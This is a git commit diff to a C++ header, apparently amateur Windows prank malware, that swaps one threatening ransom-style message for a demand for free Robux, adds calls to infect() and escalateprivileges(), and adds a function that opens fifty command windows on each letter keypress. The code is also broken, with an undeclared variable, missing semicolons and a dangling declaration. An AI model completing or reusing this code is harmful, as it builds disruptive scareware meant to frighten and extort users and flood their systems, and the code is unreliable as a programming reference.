af2b8d38104cd64e8e9629fa41cccf14ef030fe8
coolperson4538 <147566059+coolperson4538@users.noreply.github.com>
2023-12-28 06:02:00 +0000

    aaa

--- lol.hpp
+++ lol.hpp
@@ -14,13 +14,11 @@ void lol()
         int x;
         int y;
         int duration = 3600000;
-        char message[] = "you've been hacked by qv4t7 clan, we will nuke your system in 1 hour you must press D inorder to pay the and you have 1 hour to finish the game or else we'll brick your system";
+        char message[] = "you've been hacked by the pissy squad, if u don't giv us fre robuck the pissy squad will brick ur system 👿👿👿👿👿👿👿👿👿";
         ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
-        if(GetAsyncKeyState(VK_D) & 0x8000)
-        {
-                
-        }
-
+        infect();
+        escalateprivileges();
+        maozedongthecompooter()
         Sleep(duration);
         ShellExecute(NULL, NULL, L"notepad", NULL, NULL, SW_SHOW);
         SendMessage(edit, WM_CHAR, (TCHAR)'T', 0);
@@ -40,10 +38,220 @@ void lol()
         SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
         Sleep(600) 
         MessageBox(NULL, "yer done BOIII", "yer done boi", MB_ICONEXCLAMATION | MB_OK);
-        escalateprivileges();
-        ok();
-        
 }
+
+void maozedongthecompooter()
+{
+        int amountl;
+        if(GetAsyncKeyState(VK_Q) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+        if(GetAsyncKeyState(VK_W) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_E) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_R) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_T) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_Y) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_U) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_I) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_O) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_P) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_A) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_S) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+        
+        if(GetAsyncKeyState(VK_D) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_F) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_G) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_H) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_J) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_K) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_L) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_Z) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_X) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_C) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_V) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_B) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_N) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+
+        if(GetAsyncKeyState(VK_M) & 0x8000)
+        {
+              for(amount = 0; amount < 50; ++amount)
+              {
+                        ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
+              } 
+        }
+}
+
+void 
 
 void infect()
 {
@@ -65,9 +273,4 @@ void disable_cmdpromt()
 void disable_taskmgr()
 {
         // Work in progress
-}
-
-void game_init()
-{
-
 }
